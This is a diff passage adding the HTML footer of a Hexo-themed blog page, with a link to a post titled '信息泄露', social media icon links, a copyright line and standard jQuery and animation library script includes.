+                <a class="footer-post" href="/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">信息泄露</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust" target="_blank" rel="noopener">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/?lang=en" target="_blank" rel="noopener">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/" target="_blank" rel="noopener">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.instagram.com/" target="_blank" rel="noopener">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://dribbble.com/" target="_blank" rel="noopener">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/" target="_blank" rel="noopener">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.behance.net/" target="_blank" rel="noopener">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://500px.com/" target="_blank" rel="noopener">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/" target="_blank" rel="noopener">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+
+<script src="/js/main.js"></script>
+
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
